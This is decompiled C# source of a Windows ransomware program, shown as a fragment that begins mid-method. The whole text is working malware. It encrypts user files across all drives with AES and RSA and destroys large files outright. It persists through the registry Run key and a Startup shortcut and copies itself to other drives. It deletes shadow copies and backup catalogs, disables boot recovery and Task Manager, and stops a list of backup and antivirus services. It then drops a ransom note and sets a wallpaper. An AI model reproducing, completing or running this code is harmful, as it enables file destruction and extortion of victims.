			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>ujYb8Vy4mhT1ZuDuXkBWyzrABf/ki9ikGDHUO7TZaXyda9FMv7K/XnVgryO7f7mMe4tC5XrOERicNeGuwOK/IDv9tzse5lIQeIzT4JF6lrCu7phz8M/tfWZx0rLjpGeVScYRGMqu35V0O9pezP5ctiTtZjEXNFlbbQfVJQZXHJVw9WegeHf8CKjewwmmQFl03TgXtMEovFF5T3II2yehd+hB2T1q7oGew9kAyimvuqkiimYyF/GvOOX3utWpvUQIS/XojwaQSXmTG7HcgI5ApO5mEEthXA7OsZ7S06zozSMb4YFNFUybGn+Jf9VwznB2G6w9t0hep7p7Pf+es5bDPQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
